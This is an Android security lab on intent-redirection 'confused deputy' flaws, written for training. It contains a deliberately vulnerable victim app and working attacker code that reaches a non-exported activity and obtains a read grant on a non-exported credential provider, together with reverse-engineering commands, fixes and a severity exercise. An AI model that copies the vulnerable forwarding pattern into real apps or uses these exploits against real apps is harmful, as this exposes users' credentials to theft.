# Lab 03 — The Confused Deputy

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-map-the-ipc-surface.md),
[Chapter 24 §3.20 and §4.3](../README.md#320-the-confused-deputy-problem--worked-properly),
[26-Intent](../../26-Intent/README.md), [27-ContentProviders](../../27-ContentProviders/README.md)

---

## Objective

Exploit an intent-redirection flaw two ways: first to **start a non-exported activity**, and then —
the valuable one — to make the victim app **issue you a legitimate, framework-signed read grant on
its own `exported="false"` ContentProvider**. Then apply and test the three fixes, and finish by
judging the severity of a redirection honestly, including one you correctly rule out.

## Why this matters

> **Definition**
> **Confused deputy.** A program that holds authority is tricked by a less-privileged party into
> misusing that authority on the less-privileged party's behalf. Norm Hardy's 1988 example was a
> compiler that could write to a billing file and accepted an output filename from its caller. A user
> who could not write the billing file asked the compiler to write its output there. The
> compiler was not malicious and was not compromised. It was **confused about whose authority it was
> exercising**.

This is the single most important idea in the chapter, and on Android it has a very specific shape.

The framework's reachability check reduces to four rules in
`ActivityManagerService.checkComponentPermission`, and rule 2 is: **if the caller's UID equals the
component's owning UID, allow.** That rule is what lets an app's own components reach each other
regardless of `exported`. It is also exactly what an attacker borrows. When an exported component
calls `startActivity()` on an Intent that arrived from outside, the call originates inside the
victim's process with the victim's UID — and every non-exported component of that app becomes
reachable.

The URI-grant variant is worse, and it is the one worth building. `FLAG_GRANT_READ_URI_PERMISSION` is
evaluated with the **caller of `startActivity` as the granter**. If the victim makes that call,
`UriGrantsManagerService` records the victim as granter and issues a real, legitimate grant to
whoever the Intent targets. Nothing is bypassed. Nothing is exploited in the platform sense. The
victim asked for it.

You need to see the framework hand you data from an `exported="false"` provider once. After that,
"but it's not exported" stops being a reassuring sentence.

---

## Setup

Two apps. The victim is `com.iplab.deputy`; the attacker is
[`../examples/attacker-app/`](../examples/attacker-app/README.md), which already implements both
exploit shapes.

### The victim app

**`AndroidManifest.xml`** — read the comments; the security intent is entirely reasonable:

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.iplab.deputy">
    <application android:label="PhotoLab">

        <!-- The deputy. Exported so the app appears in the system share sheet. -->
        <activity android:name=".ShareHandlerActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
        </activity>

        <!-- The prize. NOT exported. Only this app can start it. -->
        <activity android:name=".AccountSettingsActivity" android:exported="false"/>

        <!-- The real prize. NOT exported. Holds cloud credentials. -->
        <provider
            android:name=".CredentialProvider"
            android:authorities="com.iplab.deputy.credentials"
            android:exported="false"
            android:grantUriPermissions="true"/>

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**`ShareHandlerActivity.java`** — the vulnerability, in four lines:

```java
package com.iplab.deputy;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class ShareHandlerActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent in = getIntent();
        Log.i("deputy", "received: " + in);

        // The app supports "continue to another screen after processing",
        // used by its own onboarding flow. The next screen travels as an extra.
        Intent next = in.getParcelableExtra("next_intent");
        if (next != null) {
            startActivity(next);      // <-- the entire bug
            finish();
            return;
        }
        processImage(in.getData());
        finish();
    }

    private void processImage(android.net.Uri uri) {
        Log.i("deputy", "processing " + uri);
    }
}
```

**`CredentialProvider.java`** — something worth stealing:

```java
package com.iplab.deputy;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;

public class CredentialProvider extends ContentProvider {
    @Override public boolean onCreate() { return true; }

    @Override public Cursor query(Uri uri, String[] p, String s, String[] a, String o) {
        MatrixCursor c = new MatrixCursor(new String[]{"_id", "service", "token"});
        c.addRow(new Object[]{1, "cloud-backup", "CLOUD_TOKEN_a1b2c3d4e5"});
        c.addRow(new Object[]{2, "photo-sync",   "SYNC_TOKEN_f6g7h8i9j0"});
        return c;
    }

    @Override public String getType(Uri uri) { return "vnd.android.cursor.dir/creds"; }
    @Override public Uri insert(Uri uri, ContentValues v) { return null; }
    @Override public int delete(Uri uri, String s, String[] a) { return 0; }
    @Override public int update(Uri uri, ContentValues v, String s, String[] a) { return 0; }
}
```

**`AccountSettingsActivity.java`** — the non-exported screen:

```java
package com.iplab.deputy;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class AccountSettingsActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        boolean show = getIntent().getBooleanExtra("show_credentials", false);
        String text = "Account settings" + (show ? "\ntoken: CLOUD_TOKEN_a1b2c3d4e5" : "");
        Log.i("deputy", "AccountSettingsActivity reached! show=" + show);
        TextView tv = new TextView(this);
        tv.setText(text);
        setContentView(tv);
    }
}
```

### Install both

```bash
# host
adb install -r deputy.apk
adb install -r attacker.apk       # ../examples/attacker-app
adb shell am start -n com.iplab.deputy/.MainActivity
```

Point the attacker app's `<queries>` at the victim, including the provider authority:

```xml
<queries>
    <package  android:name="com.iplab.deputy" />
    <provider android:authorities="com.iplab.deputy.credentials" />
</queries>
```

---

## Steps

### Step 1 — Establish the baseline: what can you reach directly?

Before any exploitation, prove that the two targets really are closed.

```bash
# adb shell
am start -n com.iplab.deputy/.AccountSettingsActivity
content query --uri content://com.iplab.deputy.credentials/tokens
```

Then the same from the unprivileged app:

```bash
# host
adb logcat -c
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.deputy --es only activities,providers
adb logcat -s poc:I
```

**Q1.** What happens in each of the four cases? Record the exact exception text.

**Q2.** `adb shell` and the probe app may behave *differently* here. Which one is authoritative for a
finding, and why?

### Step 2 — Find the deputy statically

```bash
# host
jadx -d out/ deputy.apk >/dev/null 2>&1
grep -rn "getParcelableExtra" out/sources/
grep -rnE "startActivit(y|ies)\(|startService\(|bindService\(|sendBroadcast\(" out/sources/
```

Correlate the two lists — a file appearing in both is a candidate:

```bash
# host
grep -rl "getParcelableExtra" out/sources/ | sort > /tmp/a
grep -rlE "startActivity|startService|bindService|sendBroadcast" out/sources/ | sort > /tmp/b
comm -12 /tmp/a /tmp/b
```

And in Smali, the six-instruction signature:

```bash
# host
apktool d -f deputy.apk -o work/ >/dev/null
grep -rn -A8 "getParcelableExtra" work/smali*/ \
  | grep -B4 -E "startActivity|startService|bindService|sendBroadcast"
```

**Q3.** Write out the six-instruction Smali pattern that identifies intent redirection. Which single
instruction distinguishes a redirection from an ordinary extra read?

### Step 3 — Exploit A: reach the non-exported activity

```java
// Attacker app
Intent inner = new Intent();
inner.setClassName("com.iplab.deputy",
                   "com.iplab.deputy.AccountSettingsActivity");
inner.putExtra("show_credentials", true);

Intent outer = new Intent(Intent.ACTION_SEND);
outer.setType("image/*");
outer.setClassName("com.iplab.deputy",
                   "com.iplab.deputy.ShareHandlerActivity");
outer.putExtra("next_intent", inner);
startActivity(outer);
```

Or with the probe app:

```bash
# host
adb logcat -c
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.deputy \
    --es deputy .ShareHandlerActivity \
    --es key next_intent \
    --es only deputy
adb logcat -s poc:I,deputy:I
```

**Q4.** Did `AccountSettingsActivity` launch? Which UID made the `startActivity` call that reached it,
and where in the framework was that decision made?

**Q5.** Try the same inner Intent *directly*, without the deputy, from the attacker app. Why does one
work and the other not, when the Intent is byte-for-byte identical?

### Step 4 — Exploit B: steal a URI grant (the one that matters)

```java
// Attacker app — make the deputy grant US read access to its private provider
Intent inner = new Intent(Intent.ACTION_VIEW);
inner.setClassName("com.attacker.poc", "com.attacker.poc.GrantSink");   // OUR activity
inner.setData(Uri.parse("content://com.iplab.deputy.credentials/tokens/1"));
inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

Intent outer = new Intent(Intent.ACTION_SEND);
outer.setType("image/*");
outer.setClassName("com.iplab.deputy", "com.iplab.deputy.ShareHandlerActivity");
outer.putExtra("next_intent", inner);
startActivity(outer);
```

`GrantSink` then queries the URI it was handed. Watch:

```bash
# host
adb logcat -c
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.deputy --es only deputy
adb logcat -s poc:I
```

**Q6.** Did the query succeed? Print the rows. The provider is declared `android:exported="false"` —
explain, in framework terms, how that is not a contradiction.

**Q7.** Who is recorded as the **granter**? Which AOSP service made that record, and what would have
had to be different for it to refuse?

**Q8.** Add `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` and call
`takePersistableUriPermission()` in `GrantSink`. Reboot the device and query again.

```bash
# adb shell as root — the forensic artefact
cat /data/system/uri_grants.xml
```

Does the grant survive? What does that mean for an incident responder, and why is this one of the few
IPC attacks that leaves durable, attributable evidence?

### Step 5 — Confirm dynamically

```bash
# host
frida -U -n com.iplab.deputy -l ../scripts/trace-ipc.js
```

Fire the exploit again.

**Q9.** In the trace, identify the moment an Intent that *arrived from outside* is passed to
`startActivity`. What does `trace-ipc.js` warn about when it sees a nested `Intent` in an extra?

**Q10.** What flags does the trace show on the forwarded Intent? Which of them is the finding?

### Step 6 — Fix 1: do not accept an Intent at all

```java
// FIX 1 (best) — accept an enumerated token; construct the Intent yourself.
String dest = getIntent().getStringExtra("next");
Intent next;
switch (dest == null ? "" : dest) {
    case "gallery":  next = new Intent(this, GalleryActivity.class); break;
    case "settings": next = new Intent(this, SettingsActivity.class); break;
    default:         next = new Intent(this, HomeActivity.class);
}
startActivity(next);
```

Rebuild, reinstall, re-run both exploits.

**Q11.** Which attacker capability is removed, and what is left? Can the attacker still influence
anything at all?

### Step 7 — Fix 2: validate and strip

Sometimes forwarding is a genuine product requirement. Then:

```java
// FIX 2 — prove the destination is internal and strip every dangerous property.
Intent next = getIntent().getParcelableExtra("next_intent", Intent.class); // API 33+
if (next != null) {
    ComponentName cn = next.resolveActivity(getPackageManager());
    if (cn == null || !cn.getPackageName().equals(getPackageName())) { finish(); return; }
    if (!ALLOWED_INTERNAL.contains(cn.getClassName())) { finish(); return; }
    next.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                   | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                   | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                   | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
    next.setSelector(null);
    next.setClipData(null);
    startActivity(next);
}
```

Re-run both exploits.

**Q12.** Exploit B is now dead. Is Exploit A? Which line kills which, and what happens if a future
maintainer removes only the `removeFlags` call?

**Q13.** Why is `setClipData(null)` there? What can a `ClipData` carry that a bare `setData()` cannot?

### Step 8 — Severity, honestly

Build this table for your own victim app and for a real app of your choosing:

| Redirection reaches | Severity | Justification |
|---|---|---|
| URI grant on a non-exported provider holding credentials | | |
| An internal WebView that loads your URL with app cookies | | |
| A non-exported activity that displays user data | | |
| A non-exported activity with no sensitive function | | |
| Only components that were **already exported** | | |

**Q14.** Find or construct one redirection that is **not** a finding, and write the paragraph you
would put in a report explaining why. This is the deliverable that matters most in this lab.

---

## Hints

<details>
<summary>Hint 1 — the deputy never launches</summary>

Check three things:

1. The outer Intent must satisfy the deputy's `<intent-filter>`: action `SEND`, category `DEFAULT`
   (added automatically by `startActivity` for implicit intents, but set the component explicitly and
   it does not matter), and `type` `image/*`. Missing the MIME type is the usual cause.
2. `<queries>` in the attacker manifest. Without it, `ActivityNotFoundException` looks exactly like
   "not exported".
3. `FLAG_ACTIVITY_NEW_TASK` if you start from a non-Activity context.
</details>

<details>
<summary>Hint 2 — the deputy launches but nothing is forwarded</summary>

The extra **key** must match what the deputy reads. Here it is `next_intent`. In a real app you get
the key from the decompiled source:

```bash
grep -rn -B3 -A3 "getParcelableExtra" out/sources/
```

The probe app supplies several common keys at once for exactly this reason.
</details>

<details>
<summary>Hint 3 — GrantSink launches but the query is denied</summary>

Four things to check:

1. `FLAG_GRANT_READ_URI_PERMISSION` must be on the **inner** Intent, not the outer one.
2. The provider must declare `android:grantUriPermissions="true"` (or a matching
   `<grant-uri-permission>` path). Without it there is nothing to grant.
3. The URI must be under the provider's authority and match any path restriction.
4. `GrantSink` must be `exported="true"` in the attacker manifest, because the *victim* — a different
   UID — is the one starting it.
</details>

<details>
<summary>Hint 4 — how do I know which UID made the inner call?</summary>

Watch the platform reject and accept:

```bash
# host
adb logcat | grep -iE "Permission Denial|uid=|START u0"
```

`ActivityManager`/`ActivityTaskManager` log lines name the calling UID for activity starts. Compare
the UID on the outer start with the one on the inner start — that difference is the entire attack.
</details>

<details>
<summary>Hint 5 — API level differences</summary>

The typed overload `getParcelableExtra(String, Class)` is API 33+. On lower levels use the untyped
form and check `instanceof` yourself. Also note Android 14 (API 34) stops implicit intents from
targeting non-exported components even within an app — read the version matrix in §3.2 before
declaring a behaviour universal, and state the API level every result came from.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1–Q2.** Direct attempts fail: `am start` on the non-exported activity yields `Permission Denial:
starting Intent … not exported from uid …`, and the provider query yields `SecurityException:
Permission Denial: opening provider …`.`adb shell` may be *allowed* things the app is
not — the shell is not an application. The probe app is authoritative for a finding, always.

**Q3.**

```smali
invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;
move-result-object v0
const-string v1, "next_intent"
invoke-virtual {v0, v1}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;
move-result-object v2
check-cast v2, Landroid/content/Intent;
invoke-virtual {p0, v2}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
```

The distinguishing instruction is `check-cast v2, Landroid/content/Intent;` immediately after
`getParcelableExtra`. An extra read that casts to `Intent` and is then passed to a launch API is
redirection; a cast to `Uri` or `Bundle` is not.

**Q4–Q5.** It launches. The inner `startActivity` call is made **by the victim's process**, so the
transaction carries the victim's UID, and
`ActivityManagerService.checkComponentPermission` allows it under rule 2 — caller UID equals owning
UID. The identical Intent sent directly by the attacker carries the *attacker's* UID, fails rule 2,
fails rule 3 (not exported) and is denied. Same bytes, different caller: the identity is not in the
message, it is in the kernel-stamped transaction.

**Q6–Q7.** The query succeeds and returns the credential rows. There is no contradiction:
`exported="false"` governs *direct* access, while a **URI grant** is a separate, per-URI capability
that the provider's owner may issue to anyone. `UriGrantsManagerService` records the granter as the
process that made the `startActivity` call carrying the grant flags — the victim, which owns the
provider. It would have refused if the granter did not own the authority, if
`grantUriPermissions` were absent, or if a `<grant-uri-permission>` path restriction excluded the
URI. Nothing in the platform was bypassed. The victim asked for the grant to be issued.

**Q8.** With `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` plus `takePersistableUriPermission()`, the grant
is written to `/data/system/uri_grants.xml` and survives reboot. For an incident responder that file
is one of the very few durable, attributable artefacts an IPC attack leaves behind: it names the
granting package, the receiving package and the URI. Snapshot it before and after in any forensic
exercise.

**Q9–Q10.** The trace shows `getIntent` returning an Intent whose component belongs to the victim but
whose `next_intent` extra you supplied, followed by `Activity.startActivity` with that extra's
contents as its argument. `trace-ipc.js` prints a warning the moment it sees a nested `Intent` in an
extra, because that is a capability rather than data. The flags line shows `GRANT_READ_URI` — that
flag on a forwarded Intent is the finding, more than the forwarding itself.

**Q11.** Fix 1 removes the attacker's ability to name the destination at all. They can still cause
one of three enumerated internal screens to open, which is a denial-of-nothing: those screens were
always reachable through the app's own UI, and no grant flags travel. That residual influence is not
a finding, and saying so is part of the exercise.

**Q12–Q13.** Fix 2 kills Exploit B via `removeFlags` (no grant can be issued) and kills Exploit A via
the `ALLOWED_INTERNAL` allowlist (the destination must be one you chose). Remove only the
`removeFlags` call and Exploit B comes back for any URI whose grant the allowlisted destination can
still carry — which is why both checks are needed, not either. `setClipData(null)` matters because a
`ClipData` can carry **additional URIs**, and grant flags apply to every URI an Intent references,
including those in the clip data. Sanitising only `getData()` leaves a second, quieter channel open.

**Q14.** The model paragraph: *"`ShareHandlerActivity` forwards a caller-supplied Intent. We
confirmed the forwarding occurs. However, `resolveActivity` restricts the destination to components
that are themselves declared `android:exported="true"`, and the forwarded Intent's grant flags are
stripped. An attacker therefore gains nothing they did not already have: every reachable destination
was directly reachable from an unprivileged app before the forwarding. We are not reporting this as a
vulnerability. We note it as a hardening item, because a future change to the allowlist would make it
exploitable."* That paragraph — not the exploit — is what a senior report looks like.

</details>

---

## Success criteria

- [ ] You proved, from an unprivileged app, that the non-exported activity and provider are closed
- [ ] You located the redirection statically in both Java and Smali, and can state the Smali signature
- [ ] You reached the non-exported activity through the deputy
- [ ] You explained which UID made the inner call and which AOSP rule allowed it
- [ ] You stole a read grant on an `exported="false"` provider and printed the credential rows
- [ ] You named the AOSP service that records the granter
- [ ] You made the grant persistable and found it in `/data/system/uri_grants.xml`
- [ ] You observed the whole chain live in `trace-ipc.js`
- [ ] You applied both fixes and determined which line stops which exploit
- [ ] You can explain why `setClipData(null)` is not redundant
- [ ] You completed the severity table with justifications
- [ ] You wrote the paragraph for a redirection that is **not** a finding
